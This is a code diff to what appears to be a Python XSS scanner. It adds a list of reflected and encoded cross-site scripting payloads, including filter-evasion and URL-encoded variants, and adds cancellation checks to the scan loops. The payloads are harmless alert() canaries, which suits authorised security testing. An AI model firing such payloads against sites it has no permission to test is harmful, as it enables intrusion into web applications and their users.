@@ -7,7 +7,7 @@ and form input fields.
 from __future__ import annotations
 
 import re
-from typing import Any
+from typing import Any, Callable
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 
 import httpx
@@ -25,6 +25,19 @@ REFLECTED_PAYLOADS = [
     '<svg onload=alert(1)>',
     '<body onload=alert(1)>',
     '{{7*7}}',  # template injection canary
+    '<details/open/ontoggle=alert(1)>',
+    '<video><source onerror="javascript:alert(1)">',
+    '<math><mtext></mtext><script>alert(1)</script></math>',
+    "'><svg/onload=confirm(1)>",
+    '" autofocus onfocus=alert(1) x="',
+    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
+    '<img src=1 href=1 onerror="javascript:alert(1)"></img>',
+    '<a href="javascript:alert(1)">click</a>',
+    '<input onfocus=alert(1) autofocus>',
+    '<marquee onstart=alert(1)>x</marquee>',
+    '<svg><animate onbegin=alert(1) attributeName=x dur=1s></animate></svg>',
+    '<form><button formaction="javascript:alert(1)">x</button></form>',
+    '<object data="javascript:alert(1)"></object>',
 ]
 
 ENCODED_PAYLOADS = [
@@ -32,6 +45,14 @@ ENCODED_PAYLOADS = [
     "&#60;script&#62;alert(1)&#60;/script&#62;",
     "<scr<script>ipt>alert(1)</scr</script>ipt>",
     '<img src=x onerror="&#x61;lert(1)">',
+    "%253Cscript%253Ealert(1)%253C/script%253E",
+    "&#x3c;svg onload=alert(1)&#x3e;",
+    "%3Csvg%2Fonload%3Dconfirm%601%60%3E",
+    "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+    "%22%3E%3Csvg%2Fonload%3Dconfirm%601%60%3E",
+    "%3Ciframe%20srcdoc%3D%22%3Cscript%3Ealert(1)%3C/script%3E%22%3E%3C/iframe%3E",
+    '<svg/onload=alert`1`>',
+    '<img src=x onerror=window["al"+"ert"](1)>',
 ]
 
 # DOM-based dangerous sinks in JavaScript
@@ -151,6 +172,7 @@ def test_xss(
     cookie: str | None = None,
     timeout: float = 10.0,
     quick: bool = False,
+    should_stop: Callable[[], bool] | None = None,
 ) -> list[dict[str, Any]]:
     """Run XSS tests against all endpoints and forms.
 
@@ -171,9 +193,15 @@ def test_xss(
     ) as client:
         # ── Reflected XSS on GET params ─────────────────────────────
         for url in test_endpoints:
+            if should_stop and should_stop():
+                log.info("XSS scan cancelled during reflected tests")
+                break
             params = parse_qs(urlparse(url).query)
             path = urlparse(url).path
             for param in params:
+                if should_stop and should_stop():
+                    log.info("XSS reflected testing cancelled on %s", path)
+                    break
                 sig = (path, param)
                 if sig in seen:
                     continue
@@ -186,6 +214,9 @@ def test_xss(
         visited: set[str] = set()
         dom_limit = 10 if quick else len(test_endpoints)
         for url in test_endpoints[:dom_limit]:
+            if should_stop and should_stop():
+                log.info("XSS scan cancelled during DOM analysis")
+                break
             base = urlparse(url)._replace(query="", fragment="").geturl()
             if base in visited:
                 continue
@@ -199,6 +230,9 @@ def test_xss(
 
         # ── Stored XSS via forms ────────────────────────────────────
         for form in test_forms:
+            if should_stop and should_stop():
+                log.info("XSS scan cancelled during stored-form tests")
+                break
             if form["method"] != "POST":
                 continue
             result = _test_stored(client, form, form["action"])
